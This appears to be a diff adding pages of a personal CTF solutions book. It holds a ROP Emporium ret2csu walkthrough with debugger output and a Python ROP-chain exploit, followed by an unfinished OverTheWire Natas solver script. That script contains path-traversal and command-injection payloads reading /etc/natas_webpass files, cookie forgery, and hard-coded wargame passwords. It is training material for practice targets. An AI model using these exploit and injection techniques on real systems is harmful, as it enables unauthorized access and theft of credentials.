+<li>As shown above, starting from address <code>0x0040069a</code> the gadget is actually able to <code>pop rbx; pop rbp</code> before performing the pops found earlier, so we could choose to utilise this depending on the situation</li>
+</ul>
+</blockquote>
+<h2 id="planning-rop-chain"><a class="header" href="#planning-rop-chain">Planning ROP Chain</a></h2>
+<ul>
+<li>The <code>mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]</code> gadget ends by calling a pointer to a function</li>
+<li>Therefore, we need to search the ELF binary for relatively benign functions to call that we can hopefully continue from, so list all functions:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>afl</code></p>
+</blockquote>
+<pre><code>[...]
+0x004004d0    3 23           sym._init
+0x004006b4    1 9            sym._fini
+[...]
+</code></pre>
+<ul>
+<li>These two functions above might be useful, so disassemble each one</li>
+<li>Disassemble function <code>_init</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>pdf @ sym._init</code></p>
+</blockquote>
+<pre><code>            ; CALL XREF from sym.__libc_csu_init @ 0x40066c
+            ;-- section..init:
+            ;-- .init:
+╭ 23: sym._init ();
+│           0x004004d0      4883ec08       sub rsp, 8	; [11] -r-x section size 23 named .init
+│           0x004004d4      488b051d0b20.  mov rax, qword [reloc.__gmon_start__] ; [0x600ff8:8]=0
+│           0x004004db      4885c0         test rax, rax
+│       ╭─&lt; 0x004004de      7402           je 0x4004e2
+│       │   0x004004e0      ffd0           call rax
+│       │   ; CODE XREF from sym._init @ 0x4004de
+│       ╰─&gt; 0x004004e2      4883c408       add rsp, 8
+╰           0x004004e6      c3             ret
+</code></pre>
+<ul>
+<li>Disassemble function <code>_fini</code>:</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>pdf @ sym._fini</code></p>
+</blockquote>
+<pre><code>            ;-- section..fini:
+            ;-- .fini:
+╭ 9: sym._fini ();
+│ bp: 0 (vars 0, args 0)
+│ sp: 0 (vars 0, args 0)
+│ rg: 0 (vars 0, args 0)
+│           0x004006b4      4883ec08       sub rsp, 8	; [14] -r-x section size 9 named .fini
+│           0x004006b8      4883c408       add rsp, 8
+╰           0x004006bc      c3             ret
+</code></pre>
+<ul>
+<li>Both <code>_init</code> and <code>_fini</code> functions look like they can be used, so I've chosen to use <code>_fini</code></li>
+<li>Search for references to _fini function within the ELF binary via its hex value <code>0x00000000004006b4</code> (note: need to take into account endianness):</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>/x b406400000000000</code></p>
+</blockquote>
+<pre><code>Searching 8 bytes in [0x601038-0x601040]
+hits: 0
+Searching 8 bytes in [0x600df0-0x601038]
+hits: 1
+Searching 8 bytes in [0x400000-0x400828]
+hits: 1
+Searching 8 bytes in [0x100000-0x1f0000]
+hits: 0
+0x00600e48 hit0_0 b406400000000000
+0x004003b0 hit0_1 b406400000000000
+</code></pre>
+<p>-Two matches were found, so pick one (i.e. either <code>0x00600e48</code> or <code>0x004003b0</code>) and that will be the pointer to <code>_fini</code> function</p>
+<blockquote>
+<ul>
+<li>As a sidenote, the address <code>0x00600e48</code> is in the <code>_DYNAMIC</code> object, which can be easily viewed in hex view (cycle through view modes using <code>p</code> key if necessary until you reach hex view):</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>V @ obj._DYNAMIC</code></p>
+</blockquote>
+<pre><code>[0x00600e00 [Xadvc]0 42% 1440 ./ret2csu]&gt; xc @ obj._DYNAMIC
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+[...]
+0x00600e30  0c00 0000 0000 0000 d004 4000 0000 0000  ..........@.....
+0x00600e40  0d00 0000 0000 0000 b406 4000 0000 0000  ..........@.....
+</code></pre>
+<ul>
+<li>A better view of this is in GDB:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>x/4gx (void*) &amp;_DYNAMIC + 0x38</code></p>
+</blockquote>
+<pre><code>0x600e38:	0x00000000004004d0	0x000000000000000d
+0x600e48:	0x00000000004006b4	0x0000000000000019
+</code></pre>
+<ul>
+<li>And the address <code>0x004003b0</code> is in the <code>.dynsym</code> section</li>
+</ul>
+<blockquote>
+<p>[0x00400520]&gt; <code>V @ sym..dynsym</code></p>
+</blockquote>
+<pre><code>[0x004002d0 [Xadvc]0 0% 1440 ./ret2csu]&gt; xc @ section..dynsym
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+[...]
+0x004003b0  b406 4000 0000 0000 0000 0000 0000 0000  ..@.............
+</code></pre>
+</blockquote>
+<ul>
+<li>So the plan is to:
+<ol>
+<li>Use <code>pop r12; pop r13; pop r14; pop r15; ret</code> to place our desired values into registers (most importantly r15, which will then be moved to rdx in Step 2. below)</li>
+<li>Use <code>mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]</code> to mov the values into the correct registers (except for rdi, which will need to be set afterwards in a later step)</li>
+<li>Keep control of the program after <code>call qword [r12 + rbx*8]</code> was executed in Step 2. above (continue to section below to see how this was achieved)</li>
+</ol>
+</li>
+</ul>
+<h2 id="recovering-from-a-call-instead-of-a-ret"><a class="header" href="#recovering-from-a-call-instead-of-a-ret">Recovering From a Call Instead of a Ret</a></h2>
+<ul>
+<li>In order to make a successful call to a function using <code>call qword [r12 + rbx*8]</code>, we first need to establish what value we're going to set r12 to</li>
+<li>We have determined from the previous sections that we want to call the <code>_fini</code> function, which is located at <code>0x4006b4</code>, but we need a pointer to this address due to <code>call qword [r12 + rbx*8]</code> requiring a pointer</li>
+<li>We have also found two pointers to <code>0x4006b4</code>, and we chose to use <code>0x600e48</code>, so this is value that we want <code>r12 + rbx*8</code> to evaluate to</li>
+<li>If we set rbx to zero, then r12 simply needs to be set to <code>0x600e48</code>, and we found the gadget for this which was at <code>0x40069a</code>. But what if we didn't manage to find this gadget? This is quite possible because on default settings, using command <code>/R pop rbx</code> in radare2's ROP gadget search tool won't return any results (possibly due to the gadget's length):</li>
+</ul>
+<blockquote>
+<p>$ <code>r2 -A ./ret2csu</code><br />
+[0x00400520]&gt; <code>/R pop rbx</code><br />
+[0x00400520]&gt;</p>
+</blockquote>
+<ul>
+<li>So if we assume we didn't find the <code>pop rbx</code> part of the gadget, then we need to know the value of rbx before this instruction is executed</li>
+<li>There are many ways we can determine the value of rbx. This time, I have chosen to create a <a href="https://www.man7.org/linux/man-pages/man7/fifo.7.html">FIFO</a>, then open two terminals (first for dynamic analysis of the ELF binary which accepts input from the FIFO, second to write to the FIFO).</li>
+</ul>
+<h3 id="1st-terminal-1"><a class="header" href="#1st-terminal-1">1st terminal</a></h3>
+<ul>
+<li>Make a FIFO using <code>mkfifo &lt;name_of_fifo&gt;</code>:</li>
+</ul>
+<blockquote>
+<p>$ <code>mkfifo my_fifo</code></p>
+</blockquote>
+<ul>
+<li>Open ELF binary in GDB:</li>
+</ul>
+<blockquote>
+<p>$ <code>gdb ./ret2csu -q</code></p>
+</blockquote>
+<ul>
+<li>The <code>pwnme</code> function is imported from <code>libret2csu.so</code>, so if you immediately try to disassemble <code>pwnme</code> function the addresses won't have been evaluated yet:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>Dump of assembler code for function pwnme@plt:
+   0x0000000000400500 &lt;+0&gt;:	jmp    QWORD PTR [rip+0x200b12]        # 0x601018 &lt;pwnme@got.plt&gt;
+   0x0000000000400506 &lt;+6&gt;:	push   0x0
+   0x000000000040050b &lt;+11&gt;:	jmp    0x4004f0
+End of assembler dump.
+</code></pre>
+<ul>
+<li>Therefore, use <code>start</code> to set a temporary breakpoint on main() and start executing a program under GDB:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>start</code></p>
+</blockquote>
+<pre><code>Temporary breakpoint 1 at 0x40060b
+[...]
+Temporary breakpoint 1, 0x000000000040060b in main ()
+</code></pre>
+<ul>
+<li>Now try disassembling <code>pwnme</code> function again:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>disass pwnme</code></p>
+</blockquote>
+<pre><code>Dump of assembler code for function pwnme:
+[...]
+   0x00007feee45299bf &lt;+133&gt;:	call   0x7feee45297f0 &lt;read@plt&gt;
+   0x00007feee45299c4 &lt;+138&gt;:	lea    rdi,[rip+0x34a]        # 0x7feee4529d15
+   0x00007feee45299cb &lt;+145&gt;:	call   0x7feee45297a0 &lt;puts@plt&gt;
+   0x00007feee45299d0 &lt;+150&gt;:	nop
+   0x00007feee45299d1 &lt;+151&gt;:	leave  
+   0x00007feee45299d2 &lt;+152&gt;:	ret    
+End of assembler dump.
+</code></pre>
+<ul>
+<li>Set a breakpoint before the <code>ret</code> instruction using a <strong>relative</strong> memory address, because we're going to run the program again but using the previously created FIFO for input instead of regular STDIN:</li>
+</ul>
+<blockquote>
+<p>(gdb) b *pwnme+152</p>
+</blockquote>
+<ul>
+<li>Print useful info at each breakpoint using <code>define hook-stop</code>:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>define hook-stop</code></p>
+</blockquote>
+<pre><code>Type commands for definition of &quot;hook-stop&quot;.
+End with a line saying just &quot;end&quot;.
+&gt;i r
+&gt;x/12i $rip
+&gt;x/8gx $rsp
+&gt;end
+</code></pre>
+<ul>
+<li>Now run the program again using the previously created FIFO (<code>my_fifo</code>) for input, and input <code>y</code> to start again from beginning:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>r &lt; my_fifo</code></p>
+</blockquote>
+<pre><code>The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+</code></pre>
+<ul>
+<li>As you can see, GDB is now waiting for input from the FIFO, so that's where the 2nd terminal comes in handy</li>
+</ul>
+<h3 id="2nd-terminal-1"><a class="header" href="#2nd-terminal-1">2nd terminal</a></h3>
+<ul>
+<li>We're going write a Python script that can write raw bytes to STDOUT which can interact with the FIFO we created previously. Once we've determined the correct values to use, this same script can then be easily repurposed into a get_flag script.</li>
+</ul>
+<blockquote>
+<p>$ <code>vim get_flag.py</code></p>
+</blockquote>
+<pre><code class="language-python">import struct
+import sys
+
+def p64(value: int) -&gt; bytes:
+    return struct.pack('&lt;Q', value)
+
+def main():
+    elf = './ret2csu'
+    # Goal: ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+
+    # ROP gadgets
+    ret2win_plt = 0x400510
+    pop_rdi = 0x4006a3
+    pop_r12_r13_r14_r15 = 0x40069c
+    mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8 = 0x400680
+
+    # Constants
+    padding = b'A'*8*4
+    rbx_val = 0x00      # if we're lucky, rbx will be zero and we won't need to adjust for it
+    fini_ptr = 0x600e48 # target value
+    r12_val = fini_ptr  # if we're lucky, rbx will be zero and we won't need to adjust for it
+    r12_bytes = p64(r12_val)
+    rdi_bytes = p64(0xdeadbeefdeadbeef)
+    rsi_bytes = p64(0xcafebabecafebabe)
+    rdx_bytes = p64(0xd00df00dd00df00d)
+
+    # ROP chain
+    rop_chain = b''
+    rop_chain += p64(pop_r12_r13_r14_r15) + r12_bytes + rdi_bytes + rsi_bytes + rdx_bytes # pop r12; pop r13; pop r14; pop r15; ret
+    rop_chain += p64(mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
+    rop_chain += p64(pop_rdi) + rdi_bytes # Need to set rdi again
+    rop_chain += p64(ret2win_plt) # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+
+    # Get flag
+    payload = padding + p64(0x00) + rop_chain
+    sys.stdout.buffer.write(payload)
+    
+if __name__ == '__main__':
+    main()
+</code></pre>
+<ul>
+<li>Save script and exit using <code>:wq</code>, then run Python script and write to our FIFO:</li>
+</ul>
+<blockquote>
+<p>$ <code>python get_flag.py &gt; my_fifo</code></p>
+</blockquote>
+<h3 id="back-to-1st-terminal-1"><a class="header" href="#back-to-1st-terminal-1">Back to 1st terminal</a></h3>
+<ul>
+<li>Having written to the FIFO using our Python script, GDB will now have continued execution of the program and reached our breakpoint just before the <code>ret</code> instruction:</li>
+</ul>
+<pre><code>&gt; Thank you!
+rax            0xb                 11
+rbx            0x400640            4195904
+[...]
+=&gt; 0x7f009651f9d2 &lt;pwnme+152&gt;:	ret    
+   0x7f009651f9d3 &lt;ret2win&gt;:	push   rbp
+[...]
+0x7fff08776b38:	0x000000000040069c	0x0000000000600e48
+0x7fff08776b48:	0xdeadbeefdeadbeef	0xcafebabecafebabe
+0x7fff08776b58:	0xd00df00dd00df00d	0x0000000000400680
+0x7fff08776b68:	0x00000000004006a3	0xdeadbeefdeadbeef
+
+Breakpoint 2, 0x00007f009651f9d2 in pwnme () from ./libret2csu.so
+</code></pre>
+<ul>
+<li>Unfortunately, rbx is set to 0x400640, as shown above</li>
+<li>Step through each instruction one by one until we're before the <code>call qword [r12 + rbx*8]</code> instruction to see if rbx changes:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>si</code></p>
+</blockquote>
+<ul>
+<li>We can see that as we step through instructions we're moving along our ROP chain until we reach <code>call qword [r12 + rbx*8]</code>, but unfortunately rbx is still <code>0x400640</code>:</li>
+</ul>
+<pre><code>rax            0xb                 11
+rbx            0x400640            4195904
+[...]
+=&gt; 0x400689 &lt;__libc_csu_init+73&gt;:	call   QWORD PTR [r12+rbx*8]
+   0x40068d &lt;__libc_csu_init+77&gt;:	add    rbx,0x1
+   0x400691 &lt;__libc_csu_init+81&gt;:	cmp    rbp,rbx
+   0x400694 &lt;__libc_csu_init+84&gt;:	jne    0x400680 &lt;__libc_csu_init+64&gt;
+   0x400696 &lt;__libc_csu_init+86&gt;:	add    rsp,0x8
+   0x40069a &lt;__libc_csu_init+90&gt;:	pop    rbx
+   0x40069b &lt;__libc_csu_init+91&gt;:	pop    rbp
+   0x40069c &lt;__libc_csu_init+92&gt;:	pop    r12
+   0x40069e &lt;__libc_csu_init+94&gt;:	pop    r13
+   0x4006a0 &lt;__libc_csu_init+96&gt;:	pop    r14
+   0x4006a2 &lt;__libc_csu_init+98&gt;:	pop    r15
+   0x4006a4 &lt;__libc_csu_init+100&gt;:	ret    
+0x7fff08776b68:	0x00000000004006a3	0xdeadbeefdeadbeef
+0x7fff08776b78:	0x0000000000400510	0x0000000000400520
+0x7fff08776b88:	0x00007fff08776c30	0x0000000000000000
+0x7fff08776b98:	0x0000000000000000	0x36401d3034d901d6
+0x0000000000400689 in __libc_csu_init ()
+</code></pre>
+<ul>
+<li>If we carry on stepping, we'll segfault due to the <code>call qword [r12 + rbx*8]</code> not accessing valid memory, so we'll have to adjust for the value of rbx when we set r12</li>
+<li>Our target is for <code>fini_ptr = 0x600e48</code></li>
+<li>Current value of rbp is <code>rbp_val = 0x400640</code></li>
+<li>Working backwards from when <code>r12 + rbx*8</code> is evaluated, we will set a very high value for r12 such when rbx*8 is added it overflows and the resulting memory address evaluates to 0x600e48:
+<ul>
+<li>r12_val = 0x10000000000000000 + fini_ptr - (rbp_val*8)</li>
+<li>r12_val = 0x10000000000600e48 - (0x400640*8)</li>
+<li>r12_val = 0xfffffffffe5fdc48</li>
+</ul>
+</li>
+<li>Restart program with FIFO as input <code>r &lt; my_fifo</code>, then go back to 2nd terminal to update Python script</li>
+</ul>
+<h3 id="back-to-2nd-terminal"><a class="header" href="#back-to-2nd-terminal">Back to 2nd terminal</a></h3>
+<ul>
+<li>Update Python script:</li>
+</ul>
+<pre><code class="language-python">[...]
+    rbx_val = 0x400640  # taken from program's state prior to `call qword [r12 + rbx*8]` instruction
+    fini_ptr = 0x600e48 # target value
+    r12_val = 0x10000000000000000 + fini_ptr - (rbx_val*8) # 0x10000000000600e48-(0x400640*8)==0xfffffffffe5fdc48
+[...]
+</code></pre>
+<ul>
+<li>Save script and exit, then run Python script and write to our FIFO:</li>
+</ul>
+<blockquote>
+<p>$ <code>python get_flag.py &gt; my_fifo</code></p>
+</blockquote>
+<h3 id="back-to-1st-terminal-again"><a class="header" href="#back-to-1st-terminal-again">Back to 1st terminal again</a></h3>
+<ul>
+<li>Having written to the FIFO using our updated Python script, GDB will now have continued execution of the program and reached our breakpoint just before the <code>ret</code> instruction</li>
+<li>Keep stepping through using <code>si</code> until immediately <strong>before</strong> the <code>call QWORD PTR [r12+rbx*8]</code> instruction:</li>
+</ul>
+<pre><code>=&gt; 0x400689 &lt;__libc_csu_init+73&gt;:	call   QWORD PTR [r12+rbx*8]
+   0x40068d &lt;__libc_csu_init+77&gt;:	add    rbx,0x1
+[...]
+rbx            0x400640            4195904
+rcx            0x7fe4b96111e7      140620339417575
+rdx            0xd00df00dd00df00d  -3454841397007486963
+rsi            0xcafebabecafebabe  -3819410105351357762
+rdi            0xdeadbeef          3735928559
+[...]
+r12            0xfffffffffe5fdc48  -27272120
+r13            0xdeadbeefdeadbeef  -2401053088876216593
+r14            0xcafebabecafebabe  -3819410105351357762
+r15            0xd00df00dd00df00d  -3454841397007486963
+rip            0x4006b4            0x4006b4 &lt;_fini&gt;
+[...]
+</code></pre>
+<ul>
+<li>Notice how rdx, rsi, rbx, r12 are set up as expected, hopefully the next step will step into the <code>_fini</code> function:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>si</code></p>
+</blockquote>
+<pre><code>=&gt; 0x4006b4 &lt;_fini&gt;:	sub    rsp,0x8
+   0x4006b8 &lt;_fini+4&gt;:	add    rsp,0x8
+   0x4006bc &lt;_fini+8&gt;:	ret
+[...]
+0x00000000004006b4 in _fini ()
+</code></pre>
+<ul>
+<li>It worked! After <code>_fini</code> function finishes executing, it should return back to <code>__libc_csu_init</code> immediately <strong>after</strong> the <code>call QWORD PTR [r12+rbx*8]</code> instruction, so keep stepping:</li>
+</ul>
+<blockquote>
+<p>(gdb) <code>si</code></p>
+</blockquote>
+<pre><code>[...]
+=&gt; 0x40068d &lt;__libc_csu_init+77&gt;:	add    rbx,0x1
+   0x400691 &lt;__libc_csu_init+81&gt;:	cmp    rbp,rbx
+   0x400694 &lt;__libc_csu_init+84&gt;:	jne    0x400680 &lt;__libc_csu_init+64&gt;
+   0x400696 &lt;__libc_csu_init+86&gt;:	add    rsp,0x8
+   0x40069a &lt;__libc_csu_init+90&gt;:	pop    rbx
+   0x40069b &lt;__libc_csu_init+91&gt;:	pop    rbp
+   0x40069c &lt;__libc_csu_init+92&gt;:	pop    r12
+   0x40069e &lt;__libc_csu_init+94&gt;:	pop    r13
+   0x4006a0 &lt;__libc_csu_init+96&gt;:	pop    r14
+   0x4006a2 &lt;__libc_csu_init+98&gt;:	pop    r15
+   0x4006a4 &lt;__libc_csu_init+100&gt;:	ret    
+   0x4006a5:	nop
+0x7fff4c14ad08:	0x00000000004006a3	0xdeadbeefdeadbeef
+0x7fff4c14ad18:	0x0000000000400510	0x0000000000400520
+0x7fff4c14ad28:	0x00007fff4c14add0	0x0000000000000000
+0x7fff4c14ad38:	0x0000000000000000	0x936a092fcd7ab098
+0x000000000040068d in __libc_csu_init ()
+</code></pre>
+<ul>
+<li>As we can see above, we're back in <code>__libc_csu_init</code> as expected, but there are some additional instructions that we're going to have to adjust for before the function returns</li>
+<li>The first hurdle we're going to have to overcome is that we don't want the jump to occur here:</li>
+</ul>
+<pre><code>=&gt; 0x40068d &lt;__libc_csu_init+77&gt;:	add    rbx,0x1
+   0x400691 &lt;__libc_csu_init+81&gt;:	cmp    rbp,rbx
+   0x400694 &lt;__libc_csu_init+84&gt;:	jne    0x400680 &lt;__libc_csu_init+64&gt;
+</code></pre>
+<ul>
+<li>
+<p>As shown above, rbx has 1 added to itself, rbp is compared to new rbx, then jump happens only if they're <strong>not</strong> equal. So in order for us to <strong>not</strong> jump, we want to set rbp to the new rbx value (original_rbx + 1)</p>
+</li>
+<li>
+<p>Then before we return, there are a number of stack related instructions (equivalent to 7 stack entries in total):</p>
+</li>
+</ul>
+<pre><code>   0x400696 &lt;__libc_csu_init+86&gt;:	add    rsp,0x8
+   0x40069a &lt;__libc_csu_init+90&gt;:	pop    rbx
+   0x40069b &lt;__libc_csu_init+91&gt;:	pop    rbp
+   0x40069c &lt;__libc_csu_init+92&gt;:	pop    r12
+   0x40069e &lt;__libc_csu_init+94&gt;:	pop    r13
+   0x4006a0 &lt;__libc_csu_init+96&gt;:	pop    r14
+   0x4006a2 &lt;__libc_csu_init+98&gt;:	pop    r15
+   0x4006a4 &lt;__libc_csu_init+100&gt;:	ret
+</code></pre>
+<ul>
+<li>We don't care about any of these values at this point, so we can just add nonsense values to the ROP chain for them. Note that the <code>add rsp,0x8</code> instruction doesn't affect any registers, but it effectively skips over one of our stack entries.</li>
+<li>Go back to 2nd terminal to update Python script for hopefully a successful dry run</li>
+</ul>
+<h3 id="back-to-2nd-terminal-again"><a class="header" href="#back-to-2nd-terminal-again">Back to 2nd terminal again</a></h3>
+<ul>
+<li>Update Python script:</li>
+</ul>
+<pre><code class="language-python">import struct
+import sys
+
+def p64(value: int) -&gt; bytes:
+    return struct.pack('&lt;Q', value)
+
+def main():
+    elf = './ret2csu'
+    # Goal: ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+
+    # ROP gadgets
+    ret2win_plt = 0x400510
+    pop_rdi = 0x4006a3
+    pop_r12_r13_r14_r15 = 0x40069c
+    mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8 = 0x400680
+
+    # Constants
+    padding = b'A'*8*4
+    rbx_val = 0x400640  # rbp value when executing `call qword [r12 + rbx*8]`
+    rbp_val = rbx_val+1 # to prevent jump after `0x400691 &lt;__libc_csu_init+81&gt;:	cmp rbp,rbx`
+    fini_ptr = 0x600e48 # target value
+    # NOTE: r12_val=0xfffffffffe5fdc48 so that when `r12 + rbx*8` is evaluated, set high value for r12 such when rbx*8 is added it overflows and the memory address evaluates to 0x600e48
+    r12_val = 0x10000000000000000 + fini_ptr - (rbx_val*8) # 0x10000000000600e48-(0x400640*8)==0xfffffffffe5fdc48
+    r12_bytes = p64(r12_val)
+    rdi_bytes = p64(0xdeadbeefdeadbeef)
+    rsi_bytes = p64(0xcafebabecafebabe)
+    rdx_bytes = p64(0xd00df00dd00df00d)
+
+    # ROP chain
+    rop_chain = b''
+    rop_chain += p64(pop_r12_r13_r14_r15) + r12_bytes + rdi_bytes + rsi_bytes + rdx_bytes # pop r12; pop r13; pop r14; pop r15; ret
+    rop_chain += p64(mov_rdx_r15__mov_rsi_r14__mov_edi_r13d__call_at_r12_rbx8) # mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword [r12 + rbx*8]
+    rop_chain += p64(0x00) * 7 # To maintain stack integrity after calling _fini function (pointed to by r12)
+    rop_chain += p64(pop_rdi) + rdi_bytes # Need to set rdi again
+    rop_chain += p64(ret2win_plt) # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+
+    # Get flag
+    payload = padding + p64(rbp_val) + rop_chain
+    sys.stdout.buffer.write(payload)
+    
+if __name__ == '__main__':
+    main()
+</code></pre>
+<ul>
+<li>Save script and exit, then run Python script and this time pipe output directly to the ELF binary:</li>
+</ul>
+<blockquote>
+<p>$ <code>python get_flag.py | ./ret2csu</code></p>
+</blockquote>
+<pre><code>ret2csu by ROP Emporium
+x86_64
+
+Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.
+
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<ul>
+<li>Success! The script can be left as it is as we've already read the flag, but the sample version included <a href="rop_emporium/solutions/x86_64/08-ret2csu/./get_flag.py">here</a> went a step further (only changed 2 lines of code) by using the subprocess Python module to interact with the ELF binary directly and read the flag itself without having to pipe any output in the shell.</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><p><a href="https://overthewire.org/wargames/">OverTheWire</a></p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="temporary-file-for-my-solutions-to-overthewire---natas"><a class="header" href="#temporary-file-for-my-solutions-to-overthewire---natas">Temporary file for my solutions to OverTheWire - Natas</a></h1>
+<p><a href="https://overthewire.org/wargames/natas">Natas</a></p>
+<pre><code class="language-Python">import re
+import sys
+import requests
+
+def natas0(verbose=False):
+    username = 'natas0'
+    password = username
+    url = f'http://{username}.natas.labs.overthewire.org'
+    response = requests.get(url, auth=(username, password))
+    content = response.text
+    return re.findall('&lt;!--The password for natas1 is (.*) --&gt;', content)[0]
+
+def natas1(verbose=False):
+    username = 'natas1'
+    password = 'gtVrDuiDfck831PqWsLEZy5gyDz1clto'
+    url = f'http://{username}.natas.labs.overthewire.org'
+    response = requests.get(url, auth=(username, password))
+    content = response.text
+    return re.findall('&lt;!--The password for natas2 is (.*) --&gt;', content)[0]
+
+def natas2(verbose=False):
+    username = 'natas2'
+    password = 'ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'
+    url = f'http://{username}.natas.labs.overthewire.org/files/users.txt'
+    response = requests.get(url, auth=(username, password))
+    content = response.text
+    return re.findall('natas3:(.*)', content)[0]
+
+def natas3(verbose=False):
+    username = 'natas3'
+    password = 'sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'
+    url = f'http://{username}.natas.labs.overthewire.org/s3cr3t/users.txt'
+    response = requests.get(url, auth=(username, password))
+    content = response.text
+    return re.findall('natas4:(.*)', content)[0]
+
+def natas4(verbose=False):
+    username = 'natas4'
+    password = 'Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ'
+    headers = {'Referer': 'http://natas5.natas.labs.overthewire.org/'}
+    url = f'http://{username}.natas.labs.overthewire.org'
+    response = requests.get(url, auth=(username, password), headers=headers)
+    content = response.text
+    return re.findall('Access granted. The password for natas5 is (.*)', content)[0]
+
+def natas5(verbose=False):
+    username = 'natas5'
+    password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq' 
+    cookies = {'loggedin': '1'}
+    url = f'http://{username}.natas.labs.overthewire.org'
+    with requests.Session() as session:
+        response = session.get(url, auth=(username, password), cookies=cookies)
+        content = response.text
+    return re.findall('Access granted. The password for natas6 is (.*)&lt;/div&gt;', content)[0]
+
+def natas6(verbose=False):
+    username = 'natas6'
+    password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
+    url = f'http://{username}.natas.labs.overthewire.org'
+    data = {
+        'secret': 'FOEIUWGHFEEUHOFUOIU',
+        'submit': 'submit',
+    }
+    response = requests.post(url, auth=(username, password), data=data)
+    content = response.text
+    flag = re.findall('Access granted. The password for natas7 is (.*)', content)[0]
+    return flag
+
+def natas7(verbose=False):
+    username = 'natas7'
+    password = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'
+    url = f'http://{username}.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8'
+    response = requests.post(url, auth=(username, password))
+    content = response.text
+    flag = re.findall('&lt;br&gt;\n(.*)\n\n&lt;!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 --&gt;', content)[0]
+    return flag
+
+def natas8(verbose=False):
+    import base64
+    username = 'natas8'
+    password = 'DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    # Get encoded_secret '3d3d516343746d4d6d6c315669563362' from source code URL
+    # $encodedSecret&amp;nbsp;=&amp;nbsp;&quot;3d3d516343746d4d6d6c315669563362&quot;;
+    response = requests.get(f'{url}index-source.html', auth=(username, password))
+    encoded_secret = re.findall(r'\$encodedSecret&amp;nbsp;=&amp;nbsp;&quot;([^&quot;]*)&quot;;', response.text)[0]
+
+    # Reverse secret based on source code
+    secret = base64.b64decode(bytes.fromhex(encoded_secret).decode('utf-8')[::-1]).decode()
+    data = {
+        'secret': secret,
+        'submit': 'submit',
+    }
+
+    # Pass secret value via POST request
+    response = requests.post(url, auth=(username, password), data=data)
+    content = response.text
+    flag = re.findall('Access granted. The password for natas9 is (.*)', content)[0]
+    return flag
+
+def natas9(verbose=False):
+    username = 'natas9'
+    password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
+    url = f'http://{username}.natas.labs.overthewire.org'
+    data = {
+        'needle': '; cat  /etc/natas_webpass/natas10; #',
+        'submit': 'submit',
+    }
+    response = requests.post(url, auth=(username, password), data=data)
+    content = response.text
+    flag = re.findall('Output:\n&lt;pre&gt;\n(.*)\n&lt;/pre&gt;', content)[0]
+    return flag
+
+def natas10(verbose=False):
+    username = 'natas10'
+    password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
+    url = f'http://{username}.natas.labs.overthewire.org'
+    data = {
+        'needle': '. /etc/natas_webpass/natas11 #',
+        'submit': 'submit',
+    }
+    response = requests.post(url, auth=(username, password), data=data)
+    content = response.text
+    flag = re.findall('Output:\n&lt;pre&gt;\n(.*)\n&lt;/pre&gt;', content)[0]
+    return flag
+
+def natas11(verbose=False):
+    import base64
+    import urllib
+    username = 'natas11'
+    password = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK' 
+    url = f'http://{username}.natas.labs.overthewire.org'
+
+    # PHP xor_encrypt() function from natas11 source converted to Python
+    def xor(x, y):
+        output = ''
+        for i in range(len(x)):
+            output += chr(ord(x[i]) ^ ord(y[i % len(y)]))
+        return output
+
+    with requests.Session() as session:
+        session.auth = (username, password)
+        response = session.get(url)
+
+        # Cookie received is URL encoded, so decode using urllib.parse.unquote(str)
+        cookie_received = urllib.parse.unquote(session.cookies['data'])
+        # After URL decoding, decode from base64
+        b64_decoded = base64.b64decode(cookie_received)
+
+        # Original $defaultdata = array( &quot;showpassword&quot;=&gt;&quot;no&quot;, &quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;);
